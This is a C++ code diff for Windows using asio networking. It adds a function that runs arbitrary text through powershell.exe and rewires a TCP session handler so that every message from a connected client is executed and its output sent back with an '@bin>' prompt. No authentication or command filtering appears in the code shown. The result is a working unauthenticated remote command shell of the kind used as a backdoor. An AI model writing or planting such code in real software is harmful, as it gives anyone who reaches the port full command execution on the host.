@@ -12,6 +12,56 @@
 namespace Comunicacion
 {
 
+    inline bool PowerShell(const std::string &command, std::string &resultado)
+    {
+        STARTUPINFOA si = {sizeof(STARTUPINFOA)};
+        PROCESS_INFORMATION pi;
+        SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
+
+        HANDLE hRead, hWrite;
+        if (!CreatePipe(&hRead, &hWrite, &sa, 0))
+            return false;
+
+        si.dwFlags = STARTF_USESTDHANDLES;
+        si.hStdOutput = hWrite;
+        si.hStdError = hWrite;
+        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+
+        std::string comandoReal = "powershell.exe -Command \"" + command + "\"";
+
+        std::vector<char> cmdBuffer(comandoReal.begin(), comandoReal.end());
+        cmdBuffer.push_back('\0');
+
+        BOOL success = CreateProcessA(
+            NULL,
+            cmdBuffer.data(),
+            NULL, NULL, TRUE, 0, NULL, NULL,
+            &si, &pi);
+
+        CloseHandle(hWrite);
+
+        if (!success)
+        {
+            CloseHandle(hRead);
+            return false;
+        }
+
+        char buffer[4096];
+        DWORD bytesRead;
+
+        while (ReadFile(hRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
+        {
+            resultado.append(buffer, bytesRead);
+        }
+
+        CloseHandle(hRead);
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+
+        return true;
+    }
+
     void manejarSesion(asio::ip::tcp::socket sock)
     {
         char data[4096];
@@ -39,9 +89,16 @@ namespace Comunicacion
                         break;
                     }
 
-                    // Elimina la llamada a la utilidad PowerShell
-                    std::string msg = "\n - - - - - Inicio - - - - -\n" + mensaje + "\n - - - - - Final  - - - - -\n@bin> ";
-                    asio::write(sock, asio::buffer(msg));
+                    std::string resultado;
+                    if (PowerShell(mensaje, resultado))
+                    {
+                        std::string msg = "\n - - - - - Inicio - - - - -\n" + resultado + "\n - - - - - Final  - - - - -\n@bin> ";
+                        asio::write(sock, asio::buffer(msg));
+                    }
+                    else
+                    {
+                        asio::write(sock, asio::buffer("Error ejecutando PowerShell\n@bin> "));
+                    }
                 }
             }
         }
